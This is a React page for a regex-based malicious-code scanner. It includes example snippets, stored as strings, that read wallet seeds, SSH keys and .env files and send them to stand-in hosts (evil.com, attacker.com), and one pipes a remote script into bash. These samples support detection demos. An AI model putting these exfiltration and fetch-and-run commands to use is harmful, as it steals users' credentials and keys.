import React, { useState } from 'react';
import { FileCode2, ShieldCheck, ShieldAlert, AlertTriangle, Loader2, Sparkles, ScanLine, Trash2, ChevronDown, ChevronUp } from 'lucide-react';
import { Card } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Badge } from '../components/ui/badge';
import { scanCode } from '../engine/scanner';
import { ScanHistoryStore } from '../data/store';

const EXAMPLE_SNIPPETS = [
  {
    label: 'Wallet Drainer',
    code: `// Innocuous looking helper
const config = require('./config');
const https = require('https');

// Hidden wallet exfiltration
const seed = process.env.MNEMONIC || fs.readFileSync(
  require('os').homedir() + '/.ethereum/keystore/seed.json', 'utf8'
);

// Obfuscated exfil
const payload = Buffer.from(JSON.stringify({ s: seed })).toString('base64');
eval(Buffer.from('aHR0cHM=', 'base64').toString() + '://evil.com/collect?d=' + payload);

// Fake post-install
const { exec } = require('child_process');
exec('curl -s https://evil.com/backdoor.sh | bash');`,
  },
  {
    label: 'NPM Postinstall',
    code: `// package.json postinstall script
const { execSync } = require('child_process');
const os = require('os');
const fs = require('fs');
const https = require('https');

// Steal SSH keys
const sshDir = os.homedir() + '/.ssh';
const files = fs.readdirSync(sshDir);
const keys = files.map(f => fs.readFileSync(sshDir + '/' + f, 'utf8'));

// Steal .env
const envData = fs.readFileSync(process.cwd() + '/.env', 'utf8');

// Exfiltrate
const data = JSON.stringify({ keys, env: envData, user: os.userInfo() });
const req = https.request({ hostname: 'attacker.com', path: '/steal', method: 'POST' });
req.write(data);
req.end();`,
  },
  {
    label: 'Safe Code',
    code: `// A simple Express.js server
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

app.get('/api/users/:id', async (req, res) => {
  const user = await db.findUser(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json(user);
});

app.listen(PORT, () => {
  console.log(\`Server running on port \${PORT}\`);
});`,
  },
];

function getSeverityStyle(severity) {
  switch (severity) {
    case 'critical': return { bg: 'bg-red-500/10', text: 'text-red-400', border: 'border-red-500/30', glow: 'shadow-[0_0_30px_rgba(255,42,95,0.2)]', bar: 'bg-red-500', dot: 'bg-red-500' };
    case 'high': return { bg: 'bg-orange-500/10', text: 'text-orange-400', border: 'border-orange-500/30', glow: 'shadow-[0_0_30px_rgba(255,165,0,0.2)]', bar: 'bg-orange-500', dot: 'bg-orange-500' };
    case 'medium': return { bg: 'bg-yellow-500/10', text: 'text-yellow-400', border: 'border-yellow-500/30', glow: 'shadow-[0_0_30px_rgba(255,255,0,0.15)]', bar: 'bg-yellow-500', dot: 'bg-yellow-500' };
    case 'low': return { bg: 'bg-blue-500/10', text: 'text-blue-400', border: 'border-blue-500/30', glow: '', bar: 'bg-blue-500', dot: 'bg-blue-500' };
    case 'info': return { bg: 'bg-slate-500/10', text: 'text-slate-400', border: 'border-slate-500/30', glow: '', bar: 'bg-slate-500', dot: 'bg-slate-500' };
    default: return { bg: 'bg-emerald-500/10', text: 'text-emerald-400', border: 'border-emerald-500/30', glow: 'shadow-[0_0_30px_rgba(0,250,136,0.15)]', bar: 'bg-emerald-500', dot: 'bg-emerald-500' };
  }
}

function FindingCard({ finding, index }) {
  const [expanded, setExpanded] = useState(false);
  const style = getSeverityStyle(finding.severity);

  return (
    <div className={`p-4 rounded-lg border transition-all ${style.border} ${style.bg} hover:bg-white/[0.03]`}>
      <div className="flex items-start justify-between gap-3 cursor-pointer" onClick={() => setExpanded(!expanded)}>
        <div className="flex items-start gap-3 min-w-0">
          <span className={`mt-0.5 h-2.5 w-2.5 rounded-full flex-shrink-0 ${style.dot}`} />
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-white font-medium text-sm">{finding.categoryIcon} {finding.name}</span>
              <Badge variant="outline" className={`text-[10px] uppercase ${style.text} ${style.border}`}>
                {finding.severity}
              </Badge>
            </div>
            <p className="text-xs text-slate-500 mt-0.5">Line {finding.lineNumber}</p>
          </div>
        </div>
        <button className="text-slate-500 hover:text-white transition-colors flex-shrink-0">
          {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
        </button>
      </div>

      {expanded && (
        <div className="mt-3 pl-5 space-y-2 border-t border-white/5 pt-3">
          <p className="text-xs text-slate-400">{finding.description}</p>
          <div className="rounded bg-black/40 p-2 overflow-x-auto">
            <code className="text-[11px] text-red-300 whitespace-pre">{finding.matchedLine}</code>
          </div>
          <p className="text-xs text-[#00f0ff]/70 italic">💡 {finding.remediation}</p>
        </div>
      )}
    </div>
  );
}

export default function ScanPage() {
  const [code, setCode] = useState('');
  const [result, setResult] = useState(null);
  const [isScanning, setIsScanning] = useState(false);

  const handleScan = () => {
    if (!code.trim()) return;
    setIsScanning(true);
    setResult(null);

    setTimeout(() => {
      const analysis = scanCode(code);
      setResult(analysis);
      setIsScanning(false);

      // Save to history
      try {
        ScanHistoryStore.add({
          codePreview: code.slice(0, 150),
          score: analysis.score,
          riskLevel: analysis.riskLevel,
          findingCount: analysis.findings.length,
          linesScanned: analysis.linesScanned,
        });
      } catch (e) {
        // Silently fail
      }
    }, 1500);
  };

  const handleClear = () => {
    setCode('');
    setResult(null);
  };

  const scoreStyle = result ? getSeverityStyle(result.severity) : null;

  return (
    <div className="py-8">
      {/* Header */}
      <div className="mb-8">
        <h1 className="text-3xl font-black mb-2 bg-gradient-to-r from-white to-slate-400 bg-clip-text text-transparent">
          Code Scanner
        </h1>
        <p className="text-slate-400 text-sm max-w-xl">
          Paste any code snippet, smart contract, or terminal command below. Our regex-based heuristic engine will analyze it for wallet drainers, obfuscated payloads, data exfiltration, and 40+ known malicious patterns.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Input Section */}
        <div className="space-y-4">
          <Card className="bg-[#0a0e1a]/80 border-white/10 backdrop-blur-xl p-6">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs text-slate-500 uppercase tracking-wider font-semibold">Source Code</span>
              <span className="text-xs text-slate-600">{code.split('\n').length} lines</span>
            </div>
            <textarea
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="// Paste suspicious code here..."
              rows={16}
              spellCheck={false}
              className="w-full bg-black/30 border border-white/10 rounded-lg p-4 text-[#00fa88] placeholder-slate-600 focus:outline-none focus:border-[#00f0ff]/50 focus:ring-1 focus:ring-[#00f0ff]/30 resize-none text-sm leading-relaxed transition-colors font-mono"
            />
            <div className="flex gap-3 mt-4">
              <Button
                onClick={handleScan}
                disabled={!code.trim() || isScanning}
                className="flex-1 bg-gradient-to-r from-[#00f0ff] to-[#00c4ff] text-black font-bold hover:opacity-90 transition-opacity disabled:opacity-40"
              >
                {isScanning ? (
                  <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Scanning...</>
                ) : (
                  <><ScanLine className="w-4 h-4 mr-2" /> Scan Code</>
                )}
              </Button>
              <Button onClick={handleClear} variant="outline" className="border-white/20 text-slate-400 hover:bg-white/5">
                <Trash2 className="w-4 h-4" />
              </Button>
            </div>
          </Card>

          {/* Example Snippets */}
          <Card className="bg-transparent border-none shadow-none">
            <p className="text-xs text-slate-500 mb-3 uppercase tracking-wider font-semibold flex items-center gap-2">
              <Sparkles className="w-3 h-3" /> Try an example
            </p>
            <div className="flex flex-wrap gap-2">
              {EXAMPLE_SNIPPETS.map((ex, i) => (
                <Button
                  key={i}
                  variant="outline"
                  size="sm"
                  onClick={() => { setCode(ex.code); setResult(null); }}
                  className="border-white/10 text-slate-400 hover:bg-white/5 hover:text-white text-xs"
                >
                  {ex.label}
                </Button>
              ))}
            </div>
          </Card>
        </div>

        {/* Results Section */}
        <div className="space-y-4">
          {!result && !isScanning && (
            <Card className="bg-[#0a0e1a]/40 border-dashed border-white/10 p-12 flex flex-col items-center justify-center text-center min-h-[400px]">
              <FileCode2 className="w-12 h-12 text-slate-600 mb-4" />
              <p className="text-slate-500 text-sm">Paste code and hit <span className="text-[#00f0ff]">Scan</span> to analyze for threats.</p>
            </Card>
          )}

          {isScanning && (
            <Card className="bg-[#0a0e1a]/60 border-white/10 p-12 flex flex-col items-center justify-center text-center min-h-[400px]">
              <Loader2 className="w-10 h-10 text-[#00f0ff] animate-spin mb-4" />
              <p className="text-slate-400 text-sm animate-pulse">Running pattern analysis across 40+ rules...</p>
            </Card>
          )}

          {result && !isScanning && (
            <div className="space-y-4">
              {/* Score Card */}
              <Card className={`bg-[#0a0e1a]/80 border backdrop-blur-xl p-6 ${scoreStyle.border} ${scoreStyle.glow} transition-all`}>
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    {result.severity === 'critical' || result.severity === 'high' ? (
                      <ShieldAlert className={`w-8 h-8 ${scoreStyle.text}`} />
                    ) : result.severity === 'medium' || result.severity === 'low' ? (
                      <AlertTriangle className={`w-8 h-8 ${scoreStyle.text}`} />
                    ) : (
                      <ShieldCheck className="w-8 h-8 text-emerald-400" />
                    )}
                    <div>
                      <p className={`text-lg font-black ${scoreStyle.text}`}>{result.riskLevel}</p>
                      <p className="text-xs text-slate-500">Threat Score • {result.linesScanned} lines scanned</p>
                    </div>
                  </div>
                  <div className={`text-4xl font-black ${scoreStyle.text}`}>
                    {result.score}
                  </div>
                </div>

                {/* Progress Bar */}
                <div className="w-full h-2 rounded-full bg-white/5 overflow-hidden">
                  <div
                    className={`h-full rounded-full ${scoreStyle.bar} transition-all duration-700 ease-out`}
                    style={{ width: `${result.score}%` }}
                  />
                </div>

                <p className="text-sm text-slate-400 mt-4 leading-relaxed">{result.summary}</p>
              </Card>

              {/* Category Breakdown */}
              {Object.keys(result.categoryBreakdown).length > 0 && (
                <Card className="bg-[#0a0e1a]/80 border-white/10 backdrop-blur-xl p-6">
                  <h3 className="text-sm uppercase tracking-wider text-slate-500 font-semibold mb-3">
                    Category Breakdown
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    {Object.entries(result.categoryBreakdown).map(([cat, info]) => (
                      <Badge key={cat} variant="outline" className="bg-white/5 border-white/10 text-slate-300 text-xs px-3 py-1">
                        {info.icon} {cat} <span className="ml-1.5 text-[#00f0ff] font-bold">{info.count}</span>
                      </Badge>
                    ))}
                  </div>
                </Card>
              )}

              {/* Findings */}
              {result.findings.length > 0 && (
                <Card className="bg-[#0a0e1a]/80 border-white/10 backdrop-blur-xl p-6">
                  <h3 className="text-sm uppercase tracking-wider text-slate-500 font-semibold mb-4">
                    Findings ({result.findings.length})
                  </h3>
                  <div className="space-y-2">
                    {result.findings.map((finding, i) => (
                      <FindingCard key={`${finding.patternId}-${finding.lineNumber}`} finding={finding} index={i} />
                    ))}
                  </div>
                </Card>
              )}

              {/* Safe result */}
              {result.findings.length === 0 && (
                <Card className="bg-emerald-500/5 border-emerald-500/20 p-8 text-center">
                  <ShieldCheck className="w-12 h-12 text-emerald-400 mx-auto mb-3" />
                  <p className="text-emerald-300 font-bold text-lg">No Threats Detected</p>
                  <p className="text-sm text-slate-400 mt-2">This code passed all 40+ heuristic checks. Always exercise caution with code from untrusted sources.</p>
                </Card>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
